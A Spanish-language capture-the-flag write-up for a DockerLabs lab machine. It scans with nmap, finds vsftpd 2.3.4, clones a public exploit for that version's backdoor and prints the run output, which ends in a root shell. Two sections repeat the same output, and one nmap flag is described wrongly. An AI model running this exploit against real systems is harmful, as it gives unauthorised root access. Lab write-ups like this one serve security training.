# Fase 1- Tanteo
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/c4413ca3-f8ac-4b05-87a6-5b749ce36a71)

En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.

### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

1. **21/tcp (FTP ):** vsftpd 2.3.4

# Fase 2- Exploración
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/fe9a8265-af47-4d04-a29f-315e0ca2e1e5)
Se busco la versión y el servicio del puerto corriendo en la maquina y se encontró un repositorio de GitHub.

### Exploit
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/d069f050-cf4d-4a0e-ba43-99eb55854d86)
```Python
sudo python3 -m pip install pwntools
```
Estos son los requisitos.
``` python
git clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit.git
cd vsftpd_2.3.4_Exploit/
chmod +x exploit.py
python3 exploit.py Target_IP
```
Y esto es la instalación y como se usa.

# Fase 3- Explotación
``` python
❯ sudo python3 exploit.py 172.17.0.2
[+] Got Shell!!!
[+] Opening connection to 172.17.0.2 on port 21: Done
[*] Closed connection to 172.17.0.2 port 21
[+] Opening connection to 172.17.0.2 on port 6200: Done
[*] Switching to interactive mode
$ whoami
root
$  
``` 
Lanzamos el exploit y funciono.

# Fase 4- Privilegios
``` python
❯ sudo python3 exploit.py 172.17.0.2
[+] Got Shell!!!
[+] Opening connection to 172.17.0.2 on port 21: Done
[*] Closed connection to 172.17.0.2 port 21
[+] Opening connection to 172.17.0.2 on port 6200: Done
[*] Switching to interactive mode
$ whoami
root
$  
``` 
Ya somos usuario root. Maquina Finalizada.
